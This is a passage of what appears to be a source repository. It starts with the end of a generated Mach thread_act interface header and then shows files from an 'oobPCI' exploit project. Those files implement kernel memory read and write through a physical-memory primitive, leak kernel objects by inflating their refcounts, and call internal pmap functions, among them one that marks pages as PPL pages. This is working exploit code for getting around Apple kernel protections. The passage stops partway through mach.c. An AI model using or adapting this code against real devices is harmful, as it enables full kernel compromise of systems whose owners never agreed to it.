		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} __Request__thread_set_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} __Request__thread_get_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} __Request__thread_swap_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		boolean_t set_limit;
	} __Request__thread_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
	} __Request__thread_policy_set_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		boolean_t get_default;
	} __Request__thread_policy_get_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t reply;
		/* end of the kernel processed data */
	} __Request__thread_sample_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		boolean_t trace_status;
	} __Request__etap_trace_thread_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_set;
		/* end of the kernel processed data */
	} __Request__thread_assign_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_assign_default_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_get_assignment_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pset;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		mach_msg_type_number_t limitCnt;
		integer_t limit[1];
	} __Request__thread_set_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_voucher_selector_t which;
	} __Request__thread_get_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Request__thread_set_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_voucher;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} __Request__thread_swap_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int direction;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t in_stateCnt;
		natural_t in_state[1296];
		mach_msg_type_number_t out_stateCnt;
	} __Request__thread_convert_thread_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} __Request__thread_get_exception_ports_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Request__thread_act_subsystem__defined */

/* union of all requests */

#ifndef __RequestUnion__thread_act_subsystem__defined
#define __RequestUnion__thread_act_subsystem__defined
union __RequestUnion__thread_act_subsystem {
	__Request__thread_terminate_t Request_thread_terminate;
	__Request__act_get_state_t Request_act_get_state;
	__Request__act_set_state_t Request_act_set_state;
	__Request__thread_get_state_t Request_thread_get_state;
	__Request__thread_set_state_t Request_thread_set_state;
	__Request__thread_suspend_t Request_thread_suspend;
	__Request__thread_resume_t Request_thread_resume;
	__Request__thread_abort_t Request_thread_abort;
	__Request__thread_abort_safely_t Request_thread_abort_safely;
	__Request__thread_depress_abort_t Request_thread_depress_abort;
	__Request__thread_get_special_port_t Request_thread_get_special_port;
	__Request__thread_set_special_port_t Request_thread_set_special_port;
	__Request__thread_info_t Request_thread_info;
	__Request__thread_set_exception_ports_t Request_thread_set_exception_ports;
	__Request__thread_get_exception_ports_t Request_thread_get_exception_ports;
	__Request__thread_swap_exception_ports_t Request_thread_swap_exception_ports;
	__Request__thread_policy_t Request_thread_policy;
	__Request__thread_policy_set_t Request_thread_policy_set;
	__Request__thread_policy_get_t Request_thread_policy_get;
	__Request__thread_sample_t Request_thread_sample;
	__Request__etap_trace_thread_t Request_etap_trace_thread;
	__Request__thread_assign_t Request_thread_assign;
	__Request__thread_assign_default_t Request_thread_assign_default;
	__Request__thread_get_assignment_t Request_thread_get_assignment;
	__Request__thread_set_policy_t Request_thread_set_policy;
	__Request__thread_get_mach_voucher_t Request_thread_get_mach_voucher;
	__Request__thread_set_mach_voucher_t Request_thread_set_mach_voucher;
	__Request__thread_swap_mach_voucher_t Request_thread_swap_mach_voucher;
	__Request__thread_convert_thread_state_t Request_thread_convert_thread_state;
	__Request__thread_get_exception_ports_info_t Request_thread_get_exception_ports_info;
};
#endif /* !__RequestUnion__thread_act_subsystem__defined */
/* typedefs for all replies */

#ifndef __Reply__thread_act_subsystem__defined
#define __Reply__thread_act_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_terminate_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
	} __Reply__act_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__act_set_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t old_stateCnt;
		natural_t old_state[1296];
	} __Reply__thread_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_set_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_suspend_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_resume_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_abort_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_abort_safely_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_depress_abort_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
	} __Reply__thread_get_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_set_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t thread_info_outCnt;
		integer_t thread_info_out[32];
	} __Reply__thread_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_set_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply__thread_get_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_handlers[32];
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply__thread_swap_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_policy_set_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
		boolean_t get_default;
	} __Reply__thread_policy_get_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_sample_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__etap_trace_thread_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_assign_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_assign_default_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t assigned_set;
		/* end of the kernel processed data */
	} __Reply__thread_get_assignment_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_set_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Reply__thread_get_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__thread_set_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} __Reply__thread_swap_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t out_stateCnt;
		natural_t out_state[1296];
	} __Reply__thread_convert_thread_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t masksCnt;
		exception_mask_t masks[32];
		exception_handler_info_t old_handlers_info[32];
		exception_behavior_t old_behaviors[32];
		thread_state_flavor_t old_flavors[32];
	} __Reply__thread_get_exception_ports_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Reply__thread_act_subsystem__defined */

/* union of all replies */

#ifndef __ReplyUnion__thread_act_subsystem__defined
#define __ReplyUnion__thread_act_subsystem__defined
union __ReplyUnion__thread_act_subsystem {
	__Reply__thread_terminate_t Reply_thread_terminate;
	__Reply__act_get_state_t Reply_act_get_state;
	__Reply__act_set_state_t Reply_act_set_state;
	__Reply__thread_get_state_t Reply_thread_get_state;
	__Reply__thread_set_state_t Reply_thread_set_state;
	__Reply__thread_suspend_t Reply_thread_suspend;
	__Reply__thread_resume_t Reply_thread_resume;
	__Reply__thread_abort_t Reply_thread_abort;
	__Reply__thread_abort_safely_t Reply_thread_abort_safely;
	__Reply__thread_depress_abort_t Reply_thread_depress_abort;
	__Reply__thread_get_special_port_t Reply_thread_get_special_port;
	__Reply__thread_set_special_port_t Reply_thread_set_special_port;
	__Reply__thread_info_t Reply_thread_info;
	__Reply__thread_set_exception_ports_t Reply_thread_set_exception_ports;
	__Reply__thread_get_exception_ports_t Reply_thread_get_exception_ports;
	__Reply__thread_swap_exception_ports_t Reply_thread_swap_exception_ports;
	__Reply__thread_policy_t Reply_thread_policy;
	__Reply__thread_policy_set_t Reply_thread_policy_set;
	__Reply__thread_policy_get_t Reply_thread_policy_get;
	__Reply__thread_sample_t Reply_thread_sample;
	__Reply__etap_trace_thread_t Reply_etap_trace_thread;
	__Reply__thread_assign_t Reply_thread_assign;
	__Reply__thread_assign_default_t Reply_thread_assign_default;
	__Reply__thread_get_assignment_t Reply_thread_get_assignment;
	__Reply__thread_set_policy_t Reply_thread_set_policy;
	__Reply__thread_get_mach_voucher_t Reply_thread_get_mach_voucher;
	__Reply__thread_set_mach_voucher_t Reply_thread_set_mach_voucher;
	__Reply__thread_swap_mach_voucher_t Reply_thread_swap_mach_voucher;
	__Reply__thread_convert_thread_state_t Reply_thread_convert_thread_state;
	__Reply__thread_get_exception_ports_info_t Reply_thread_get_exception_ports_info;
};
#endif /* !__RequestUnion__thread_act_subsystem__defined */

#ifndef subsystem_to_name_map_thread_act
#define subsystem_to_name_map_thread_act \
    { "thread_terminate", 3600 },\
    { "act_get_state", 3601 },\
    { "act_set_state", 3602 },\
    { "thread_get_state", 3603 },\
    { "thread_set_state", 3604 },\
    { "thread_suspend", 3605 },\
    { "thread_resume", 3606 },\
    { "thread_abort", 3607 },\
    { "thread_abort_safely", 3608 },\
    { "thread_depress_abort", 3609 },\
    { "thread_get_special_port", 3610 },\
    { "thread_set_special_port", 3611 },\
    { "thread_info", 3612 },\
    { "thread_set_exception_ports", 3613 },\
    { "thread_get_exception_ports", 3614 },\
    { "thread_swap_exception_ports", 3615 },\
    { "thread_policy", 3616 },\
    { "thread_policy_set", 3617 },\
    { "thread_policy_get", 3618 },\
    { "thread_sample", 3619 },\
    { "etap_trace_thread", 3620 },\
    { "thread_assign", 3621 },\
    { "thread_assign_default", 3622 },\
    { "thread_get_assignment", 3623 },\
    { "thread_set_policy", 3624 },\
    { "thread_get_mach_voucher", 3625 },\
    { "thread_set_mach_voucher", 3626 },\
    { "thread_swap_mach_voucher", 3627 },\
    { "thread_convert_thread_state", 3628 },\
    { "thread_get_exception_ports_info", 3630 }
#endif

#ifdef __AfterMigUserHeader
__AfterMigUserHeader
#endif /* __AfterMigUserHeader */

#endif	 /* _thread_act_user_ */

```

`Exploits/oobPCI/Sources/includeme.h`:

```h
//
//  includeme.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef includeme_h
#define includeme_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <ptrauth.h>

// SpawnDrv/kexploitd helper functions
#define DBG_DK_FUNC(id)      ptrauth_sign_unauthenticated((void*)(0x4142434400ULL + (id * 4ULL)), ptrauth_key_function_pointer, 0)
#define DBG_EXPLOIT_FUNC(id) ptrauth_sign_unauthenticated((void*)(0x4841585800ULL + (id * 4ULL)), ptrauth_key_function_pointer, 0)

#define DBG_DK_FUNC_CHECKIN DBG_DK_FUNC(0)
#define DBG_DK_FUNC_NOTIFY  DBG_DK_FUNC(1)

#define DBG_GETOFFSETS_FUNC  DBG_EXPLOIT_FUNC(0)
#define DBG_KRW_READY_FUNC   DBG_EXPLOIT_FUNC(1)
#define DBG_SET_FAULT_HNDLR  DBG_EXPLOIT_FUNC(2)
#define DBG_GET_REQUEST      DBG_EXPLOIT_FUNC(3)
#define DBG_SEND_REPLY       DBG_EXPLOIT_FUNC(4)

// Debug stuff
#define DBGPRINT_ADDRVAR(var) printf("[DBG] %s: %s @ %p\n", __func__, #var, (void*) var)
#define DBGPRINT_VAR(var)     printf("[DBG] %s: %s: %p\n", __func__, #var, (void*) (uint64_t) var)

// Did I mention that I love Swift?
#define guard(cond) if (__builtin_expect(!!(cond), 1)) {}

#define MEMORY_BARRIER asm volatile("dmb sy");

extern void status_update(const char *status);

#endif /* includeme_h */

```

`Exploits/oobPCI/Sources/kernel.c`:

```c
//
//  kernel.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "kernel.h"

#include "includeme.h"
#include "offsets.h"
#include "badRecovery.h"

kern_return_t pmap_enter_options_addr(uint64_t pmap, uint64_t pa, uint64_t va) {
    uint64_t pmap_enter_options_addr_ptr = SLIDE(gOffsets.pmap_enter_options_addr);
    
    while (1) {
        kern_return_t kr = (kern_return_t) kcall(pmap_enter_options_addr_ptr, pmap, va, pa, VM_PROT_READ | VM_PROT_WRITE, 0, 0, 1, 1);
        if (kr != KERN_RESOURCE_SHORTAGE) {
            return kr;
        }
    }
}

void pmap_remove(uint64_t pmap, uint64_t start, uint64_t end) {
    uint64_t pmap_remove_options_ptr = SLIDE(gOffsets.pmap_remove_options);
    
    kcall(pmap_remove_options_ptr, pmap, start, end, 0x100, 0, 0, 0, 0);
}

void pmap_set_nested(uint64_t pmap) {
    uint64_t pmap_set_nested_ptr = SLIDE(gOffsets.pmap_set_nested);
    
    kcall(pmap_set_nested_ptr, pmap, 0, 0, 0, 0, 0, 0, 0);
}

kern_return_t pmap_nest(uint64_t grand, uint64_t subord, uint64_t vstart, uint64_t size) {
    uint64_t pmap_nest_ptr = SLIDE(gOffsets.pmap_nest);
    
    return (kern_return_t) kcall(pmap_nest_ptr, grand, subord, vstart, size, 0, 0, 0, 0);
}

void pmap_mark_page_as_ppl_page(uint64_t page) {
    uint64_t pmap_mark_page_as_ppl_page_ptr = SLIDE(gOffsets.pmap_mark_page_as_ppl_page);
    
    kcall(pmap_mark_page_as_ppl_page_ptr, page, 1, 0, 0, 0, 0, 0, 0);
}

```

`Exploits/oobPCI/Sources/kernel.h`:

```h
//
//  kernel.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef kernel_h
#define kernel_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

kern_return_t pmap_enter_options_addr(uint64_t pmap, uint64_t pa, uint64_t va);
void pmap_remove(uint64_t pmap, uint64_t start, uint64_t end);

void pmap_set_nested(uint64_t pmap);
kern_return_t pmap_nest(uint64_t grand, uint64_t subord, uint64_t vstart, uint64_t size);

void pmap_mark_page_as_ppl_page(uint64_t page);

#endif /* kernel_h */


```

`Exploits/oobPCI/Sources/kernrw_alloc.c`:

```c
//
//  kernrw_alloc.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "kernrw_alloc.h"

#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <mach/mach.h>

#include "includeme.h"
#include "offsets.h"
#include "physrw.h"

bool kernread(uint64_t addr, size_t len, void *buf) {
    uint8_t *buffer = (uint8_t*) buf;
    
    while (len) {
        uint64_t page   = addr & ~0x3FFFULL;
        uint64_t off    = addr & 0x3FFFULL;
        uint64_t curLen = 0x4000ULL - off;
        if (len < curLen) {
            curLen = len;
        }
        
        uint64_t phys = translateAddr(page);
        guard (phys != 0) else {
            return false;
        }
        
        guard (physread(phys + off, curLen, (void*) buffer)) else {
            return false;
        }
        
        addr   += curLen;
        buffer += curLen;
        len    -= curLen;
    }
    
    return true;
}

bool kernwrite(uint64_t addr, void *buf, size_t len) {
    uint8_t *buffer = (uint8_t*) buf;
    
    while (len) {
        uint64_t page   = addr & ~0x3FFFULL;
        uint64_t off    = addr & 0x3FFFULL;
        uint64_t curLen = 0x4000ULL - off;
        if (len < curLen) {
            curLen = len;
        }
        
        uint64_t phys = translateAddr(page);
        guard (phys != 0) else {
            return false;
        }
        
        guard (physwrite(phys + off, (void*) buffer, curLen)) else {
            return false;
        }
        
        addr   += curLen;
        buffer += curLen;
        len    -= curLen;
    }
    
    return true;
}

uint64_t kmemAlloc(uint64_t size, void **mappedAddr, bool leak) {
    mach_port_t buffer = IOBufferMemoryDescriptor_create(3, size, 0);
    guard (buffer != 0) else {
        puts("[-] kmemAlloc: Failed to create IOBufferMemoryDescriptor!");
        return 0;
    }
    
    if (mappedAddr) {
        *mappedAddr = (void*) IOMemoryDescriptor_map(buffer, 0, 0);
    }
    
    uint64_t kObject = portKObject(buffer);
    guard (kObject != 0) else {
        puts("[-] kmemAlloc: Failed to get IOBufferMemoryDescriptor kObject!");
        return 0;
    }
    
    // Get ranges
    uint64_t memRanges = pcidev_rPtr(kObject + 0x60);
    guard (memRanges != 0) else {
        puts("[-] kmemAlloc: Failed to get IOBufferMemoryDescriptor _ranges!");
        return 0;
    }
    
    // Leak object if requested
    // XXX: Always leak...
    //if (leak) {
        // Increase refcount
        uint32_t refcount = pcidev_r32(kObject + 0x8ULL);
        pcidev_w32(kObject + 0x8ULL, refcount + 0x1337);
    //}
    
    return pcidev_rPtr(memRanges);
}

```

`Exploits/oobPCI/Sources/kernrw_alloc.h`:

```h
//
//  kernrw_alloc.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef kernrw_alloc_h
#define kernrw_alloc_h

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

bool kernread (uint64_t addr, size_t len, void *buffer);
bool kernwrite(uint64_t addr, void *buffer, size_t len);

uint64_t kmemAlloc(uint64_t size, void **mappedAddr, bool leak);

#endif /* kernrw_alloc_h */

```

`Exploits/oobPCI/Sources/mach.c`:

```c
//
//  mach.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include <stdio.h>
#include <mach/mach.h>
#include <mach/machine/ndr_def.h>

#include "generated/device.h"

#undef _mach_host_user_

#include "generated/mach_host.h"

#undef mach_task_self

extern mach_port_t mach_task_self(void);
extern kern_return_t mach_msg_trap(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify);
extern kern_return_t mach_msg_overwrite_trap(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify, mach_msg_header_t *rcv_msg, mach_msg_size_t rcv_limit);
extern mach_port_t mach_reply_port(void);

mach_port_t mach_task_self_;
mach_port_t ioMasterPort;

void mach_init(void) {
    mach_task_self_ = mach_task_self();
    
    host_get_io_main(mach_host_self(), &ioMasterPort);
}

kern_return_t IOMasterPort(mach_port_t bp, mach_port_t *master) {
    return host_get_io_main(mach_host_self(), master);
}

mach_port_t IORegistryEntryFromPath(mach_port_t master, char *path) {
    mach_port_t entry = 0;
    if (io_registry_entry_from_path(master, path, &entry) == KERN_SUCCESS) {
        return entry;
    }
    
    return 0;
}

kern_return_t IOServiceOpen(mach_port_t service, task_port_t owningTask, uint32_t type, mach_port_t *connect) {
    kern_return_t result = KERN_SUCCESS;
    kern_return_t rpcRes = io_service_open_extended(service, owningTask, type, NDR_record, NULL, 0, &result, connect);
    if (rpcRes != KERN_SUCCESS) {
        return rpcRes;
    }
    
    return result;
}

void IOObjectRelease(mach_port_t obj) {
    mach_port_deallocate(mach_task_self_, obj);
}

mach_port_t IOServiceMatchingDescriptor(const char *descriptor) {
    mach_port_t service = 0;
    kern_return_t result = 0;
    kern_return_t kr = io_service_get_matching_service_ool(ioMasterPort, (io_buf_ptr_t) descriptor, (mach_msg_type_number_t) strlen(descriptor) + 1, &result, &service);
    if (kr == KERN_SUCCESS && result == KERN_SUCCESS) {
        return service;
    }
    
